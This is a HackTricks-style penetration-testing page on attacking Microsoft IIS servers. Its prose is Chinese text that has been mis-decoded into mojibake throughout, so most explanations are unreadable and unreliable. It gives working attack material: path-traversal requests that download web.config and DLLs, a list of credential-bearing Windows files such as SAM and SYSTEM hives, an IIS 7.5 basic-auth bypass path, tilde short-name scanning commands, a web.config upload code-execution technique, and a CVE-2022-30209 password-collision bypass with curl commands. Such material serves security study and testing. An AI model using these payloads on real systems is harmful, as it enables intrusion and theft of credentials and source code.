# IIS - Internet Information Services

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

æµ‹è¯•å¯æ‰§è¡Œæ–‡ä»¶æ‰©å±•åï¼š

* asp
* aspx
* config
* php

## å†…éƒ¨ IP åœ°å€æ³„éœ²

åœ¨ä»»ä½• IIS æœåŠ¡å™¨ä¸Šï¼Œå¦‚æœä½ å¾—åˆ°ä¸€ä¸ª 302ï¼Œä½ å¯ä»¥å°è¯•å»æ‰ Host å¤´å¹¶ä½¿ç”¨ HTTP/1.0ï¼Œå“åº”ä¸­çš„ Location å¤´å¯èƒ½ä¼šæŒ‡å‘å†…éƒ¨ IP åœ°å€ï¼š
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
å“åº”æ³„éœ²å†…éƒ¨IPï¼š
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## æ‰§è¡Œ .config æ–‡ä»¶

æ‚¨å¯ä»¥ä¸Šä¼  .config æ–‡ä»¶å¹¶ä½¿ç”¨å®ƒä»¬æ‰§è¡Œä»£ç ã€‚å®ç°æ­¤ç›®çš„çš„ä¸€ç§æ–¹æ³•æ˜¯åœ¨æ–‡ä»¶æœ«å°¾çš„ HTML æ³¨é‡Šä¸­é™„åŠ ä»£ç ï¼š[åœ¨æ­¤ä¸‹è½½ç¤ºä¾‹](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

æœ‰å…³åˆ©ç”¨æ­¤æ¼æ´çš„æ›´å¤šä¿¡æ¯å’ŒæŠ€æœ¯ [è¯·ç‚¹å‡»è¿™é‡Œ](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## IIS å‘ç°æš´åŠ›ç ´è§£

ä¸‹è½½æˆ‘åˆ›å»ºçš„åˆ—è¡¨ï¼š

{% file src="../../.gitbook/assets/iisfinal.txt" %}

å®ƒæ˜¯é€šè¿‡åˆå¹¶ä»¥ä¸‹åˆ—è¡¨çš„å†…å®¹åˆ›å»ºçš„ï¼š

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

ä½¿ç”¨æ—¶ä¸è¦æ·»åŠ ä»»ä½•æ‰©å±•åï¼Œæ‰€éœ€çš„æ–‡ä»¶å·²ç»åŒ…å«ã€‚

## è·¯å¾„éå†

### æ³„éœ²æºä»£ç 

æŸ¥çœ‹å®Œæ•´çš„å†™ä½œå†…å®¹ï¼š [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

{% hint style="info" %}
æ€»ç»“æ¥è¯´ï¼Œåº”ç”¨ç¨‹åºçš„æ–‡ä»¶å¤¹ä¸­æœ‰å¤šä¸ª web.config æ–‡ä»¶ï¼Œé‡Œé¢å¼•ç”¨äº† "**assemblyIdentity**" æ–‡ä»¶å’Œ "**namespaces**"ã€‚é€šè¿‡è¿™äº›ä¿¡æ¯ï¼Œå¯ä»¥çŸ¥é“ **å¯æ‰§è¡Œæ–‡ä»¶çš„ä½ç½®** å¹¶ä¸‹è½½å®ƒä»¬ã€‚\
ä» **ä¸‹è½½çš„ Dlls** ä¸­ï¼Œè¿˜å¯ä»¥æ‰¾åˆ° **æ–°çš„ namespaces**ï¼Œæ‚¨åº”è¯¥å°è¯•è®¿é—®å¹¶è·å– web.config æ–‡ä»¶ï¼Œä»¥ä¾¿æ‰¾åˆ°æ–°çš„ namespaces å’Œ assemblyIdentityã€‚\
æ­¤å¤–ï¼Œæ–‡ä»¶ **connectionstrings.config** å’Œ **global.asax** å¯èƒ½åŒ…å«æœ‰è¶£çš„ä¿¡æ¯ã€‚\\
{% endhint %}

åœ¨ **.Net MVC åº”ç”¨ç¨‹åº** ä¸­ï¼Œ**web.config** æ–‡ä»¶é€šè¿‡ **"assemblyIdentity"** XML æ ‡ç­¾æŒ‡å®šåº”ç”¨ç¨‹åºæ‰€ä¾èµ–çš„æ¯ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå‘æŒ¥ç€è‡³å…³é‡è¦çš„ä½œç”¨ã€‚

### **æ¢ç´¢äºŒè¿›åˆ¶æ–‡ä»¶**

è®¿é—® **web.config** æ–‡ä»¶çš„ç¤ºä¾‹å¦‚ä¸‹ï¼š
```markup
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
æ­¤è¯·æ±‚æ­ç¤ºäº†å„ç§è®¾ç½®å’Œä¾èµ–å…³ç³»ï¼Œä¾‹å¦‚ï¼š

* **EntityFramework** ç‰ˆæœ¬
* **AppSettings** ç”¨äºç½‘é¡µã€å®¢æˆ·ç«¯éªŒè¯å’ŒJavaScript
* **System.web** èº«ä»½éªŒè¯å’Œè¿è¡Œæ—¶é…ç½®
* **System.webServer** æ¨¡å—è®¾ç½®
* **Runtime** ç¨‹åºé›†ç»‘å®šï¼Œé€‚ç”¨äºå¤šä¸ªåº“ï¼Œå¦‚ **Microsoft.Owin**ã€**Newtonsoft.Json** å’Œ **System.Web.Mvc**

è¿™äº›è®¾ç½®è¡¨æ˜æŸäº›æ–‡ä»¶ï¼Œä¾‹å¦‚ **/bin/WebGrease.dll**ï¼Œä½äºåº”ç”¨ç¨‹åºçš„ /bin æ–‡ä»¶å¤¹å†…ã€‚

### **æ ¹ç›®å½•æ–‡ä»¶**

åœ¨æ ¹ç›®å½•ä¸­æ‰¾åˆ°çš„æ–‡ä»¶ï¼Œå¦‚ **/global.asax** å’Œ **/connectionstrings.config**ï¼ˆåŒ…å«æ•æ„Ÿå¯†ç ï¼‰ï¼Œå¯¹äºåº”ç”¨ç¨‹åºçš„é…ç½®å’Œæ“ä½œè‡³å…³é‡è¦ã€‚

### **å‘½åç©ºé—´å’Œ Web.Config**

MVC åº”ç”¨ç¨‹åºè¿˜ä¸ºç‰¹å®šå‘½åç©ºé—´å®šä¹‰é¢å¤–çš„ **web.config æ–‡ä»¶**ï¼Œä»¥é¿å…åœ¨æ¯ä¸ªæ–‡ä»¶ä¸­é‡å¤å£°æ˜ï¼Œå¦‚é€šè¿‡è¯·æ±‚ä¸‹è½½å¦ä¸€ä¸ª **web.config** æ‰€ç¤ºï¼š
```markup
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **ä¸‹è½½ DLL**

æåˆ°è‡ªå®šä¹‰å‘½åç©ºé—´æš—ç¤ºåœ¨ /bin ç›®å½•ä¸­å­˜åœ¨ä¸€ä¸ªåä¸º "**WebApplication1**" çš„ DLLã€‚æ¥ä¸‹æ¥ï¼Œæ˜¾ç¤ºäº†ä¸‹è½½ **WebApplication1.dll** çš„è¯·æ±‚ï¼š
```markup
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
è¿™è¡¨æ˜åœ¨ /bin ç›®å½•ä¸­å­˜åœ¨å…¶ä»–é‡è¦çš„ DLLï¼Œä¾‹å¦‚ **System.Web.Mvc.dll** å’Œ **System.Web.Optimization.dll**ã€‚

åœ¨ä¸€ä¸ª DLL å¯¼å…¥åä¸º **WebApplication1.Areas.Minded** çš„å‘½åç©ºé—´çš„åœºæ™¯ä¸­ï¼Œæ”»å‡»è€…å¯èƒ½æ¨æ–­å‡ºåœ¨å¯é¢„æµ‹è·¯å¾„ä¸­å­˜åœ¨å…¶ä»– web.config æ–‡ä»¶ï¼Œä¾‹å¦‚ **/area-name/Views/**ï¼Œå…¶ä¸­åŒ…å«ç‰¹å®šçš„é…ç½®å’Œå¯¹ /bin æ–‡ä»¶å¤¹ä¸­å…¶ä»– DLL çš„å¼•ç”¨ã€‚ä¾‹å¦‚ï¼Œå¯¹ **/Minded/Views/web.config** çš„è¯·æ±‚å¯ä»¥æ­ç¤ºé…ç½®å’Œå‘½åç©ºé—´ï¼Œè¡¨æ˜å­˜åœ¨å¦ä¸€ä¸ª DLL **WebApplication1.AdditionalFeatures.dll**ã€‚

### å¸¸è§æ–‡ä»¶

æ¥è‡ª [è¿™é‡Œ](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 é”™è¯¯

å¦‚æœä½ çœ‹åˆ°å¦‚ä¸‹é”™è¯¯ï¼š

![](<../../.gitbook/assets/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (10) (2).png>)

è¿™æ„å‘³ç€æœåŠ¡å™¨**æ²¡æœ‰åœ¨ Host å¤´ä¸­æ¥æ”¶åˆ°æ­£ç¡®çš„åŸŸå**ã€‚\
ä¸ºäº†è®¿é—®ç½‘é¡µï¼Œä½ å¯ä»¥æŸ¥çœ‹æä¾›çš„**SSL è¯ä¹¦**ï¼Œä¹Ÿè®¸å¯ä»¥åœ¨å…¶ä¸­æ‰¾åˆ°åŸŸå/å­åŸŸåã€‚å¦‚æœæ²¡æœ‰ï¼Œä½ å¯èƒ½éœ€è¦**æš´åŠ›ç ´è§£ VHosts**ï¼Œç›´åˆ°æ‰¾åˆ°æ­£ç¡®çš„ã€‚

## å€¼å¾—å…³æ³¨çš„æ—§ IIS æ¼æ´

### Microsoft IIS æ³¢æµªå­—ç¬¦â€œ\~â€ æ¼æ´/ç‰¹æ€§ â€“ çŸ­æ–‡ä»¶/æ–‡ä»¶å¤¹åç§°æ³„éœ²

ä½ å¯ä»¥å°è¯•ä½¿ç”¨æ­¤**æŠ€æœ¯**æ¥**æšä¸¾æ¯ä¸ªå‘ç°çš„æ–‡ä»¶å¤¹**ä¸­çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ï¼ˆå³ä½¿å®ƒéœ€è¦åŸºæœ¬èº«ä»½éªŒè¯ï¼‰ã€‚\
å¦‚æœæœåŠ¡å™¨å­˜åœ¨æ¼æ´ï¼Œè¿™ç§æŠ€æœ¯çš„ä¸»è¦é™åˆ¶æ˜¯**å®ƒåªèƒ½æ‰¾åˆ°æ¯ä¸ªæ–‡ä»¶/æ–‡ä»¶å¤¹åç§°çš„å‰ 6 ä¸ªå­—æ¯å’Œæ–‡ä»¶æ‰©å±•åçš„å‰ 3 ä¸ªå­—æ¯**ã€‚

ä½ å¯ä»¥ä½¿ç”¨ [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) æ¥æµ‹è¯•æ­¤æ¼æ´ï¼š`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../.gitbook/assets/image (844).png>)

åŸå§‹ç ”ç©¶ï¼š[https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf](https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf)

ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨**metasploit**ï¼š`use scanner/http/iis_shortname_scanner`

### åŸºæœ¬èº«ä»½éªŒè¯ç»•è¿‡

**ç»•è¿‡**åŸºæœ¬èº«ä»½éªŒè¯ï¼ˆ**IIS 7.5**ï¼‰ï¼Œå°è¯•è®¿é—®ï¼š`/admin:$i30:$INDEX_ALLOCATION/admin.php` æˆ– `/admin::$INDEX_ALLOCATION/admin.php`

ä½ å¯ä»¥å°è¯•å°†æ­¤**æ¼æ´**ä¸ä¸Šä¸€ä¸ªç»“åˆï¼Œä»¥æ‰¾åˆ°æ–°çš„**æ–‡ä»¶å¤¹**å¹¶**ç»•è¿‡**èº«ä»½éªŒè¯ã€‚

## ASP.NET Trace.AXD å¯ç”¨è°ƒè¯•

ASP.NET åŒ…å«è°ƒè¯•æ¨¡å¼ï¼Œå…¶æ–‡ä»¶åä¸º `trace.axd`ã€‚

å®ƒä¿æŒå¯¹åœ¨ä¸€æ®µæ—¶é—´å†…å¯¹åº”ç”¨ç¨‹åºå‘å‡ºçš„æ‰€æœ‰è¯·æ±‚çš„è¯¦ç»†æ—¥å¿—ã€‚

æ­¤ä¿¡æ¯åŒ…æ‹¬è¿œç¨‹å®¢æˆ·ç«¯ IPã€ä¼šè¯ IDã€æ‰€æœ‰è¯·æ±‚å’Œå“åº” cookieã€ç‰©ç†è·¯å¾„ã€æºä»£ç ä¿¡æ¯ï¼Œç”šè‡³å¯èƒ½åŒ…æ‹¬ç”¨æˆ·åå’Œå¯†ç ã€‚

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH Cookie

ASPXAUTH ä½¿ç”¨ä»¥ä¸‹ä¿¡æ¯ï¼š

* **`validationKey`**ï¼ˆå­—ç¬¦ä¸²ï¼‰ï¼šç”¨äºç­¾åéªŒè¯çš„åå…­è¿›åˆ¶ç¼–ç å¯†é’¥ã€‚
* **`decryptionMethod`**ï¼ˆå­—ç¬¦ä¸²ï¼‰ï¼šï¼ˆé»˜è®¤â€œAESâ€ï¼‰ã€‚
* **`decryptionIV`**ï¼ˆå­—ç¬¦ä¸²ï¼‰ï¼šåå…­è¿›åˆ¶ç¼–ç çš„åˆå§‹åŒ–å‘é‡ï¼ˆé»˜è®¤ä¸ºé›¶å‘é‡ï¼‰ã€‚
* **`decryptionKey`**ï¼ˆå­—ç¬¦ä¸²ï¼‰ï¼šç”¨äºè§£å¯†çš„åå…­è¿›åˆ¶ç¼–ç å¯†é’¥ã€‚

ç„¶è€Œï¼Œæœ‰äº›äººä¼šä½¿ç”¨è¿™äº›å‚æ•°çš„**é»˜è®¤å€¼**ï¼Œå¹¶å°†**ç”¨æˆ·çš„ç”µå­é‚®ä»¶ä½œä¸º cookie**ã€‚å› æ­¤ï¼Œå¦‚æœä½ èƒ½æ‰¾åˆ°ä¸€ä¸ªä½¿ç”¨**ç›¸åŒå¹³å°**çš„ç½‘é¡µï¼Œå¹¶ä¸”ä½¿ç”¨ ASPXAUTH cookieï¼Œä½ **åœ¨è¢«æ”»å‡»çš„æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªä¸è¦å†’å……çš„ç”¨æˆ·ç›¸åŒçš„ç”µå­é‚®ä»¶çš„ç”¨æˆ·**ï¼Œä½ å¯èƒ½èƒ½å¤Ÿåœ¨ç¬¬ä¸€ä¸ªæœåŠ¡å™¨ä¸­**ä½¿ç”¨ç¬¬äºŒä¸ªæœåŠ¡å™¨çš„ cookie**ï¼Œå¹¶å†’å……è¯¥ç”¨æˆ·ã€‚\
è¿™ä¸ªæ”»å‡»åœ¨è¿™ä¸ª [**å†™ä½œ**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19) ä¸­æœ‰æ•ˆã€‚

## IIS èº«ä»½éªŒè¯ç»•è¿‡ä¸ç¼“å­˜å¯†ç ï¼ˆCVE-2022-30209ï¼‰ <a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>

[å®Œæ•´æŠ¥å‘Šåœ¨è¿™é‡Œ](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html)ï¼šä»£ç ä¸­çš„ä¸€ä¸ªé”™è¯¯**æ²¡æœ‰æ­£ç¡®æ£€æŸ¥ç”¨æˆ·æä¾›çš„å¯†ç **ï¼Œå› æ­¤ä¸€ä¸ª**å¯†ç å“ˆå¸Œå‘½ä¸­**å·²ç»åœ¨**ç¼“å­˜**ä¸­çš„å¯†é’¥çš„æ”»å‡»è€…å°†èƒ½å¤Ÿä»¥è¯¥ç”¨æˆ·èº«ä»½ç™»å½•ã€‚
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
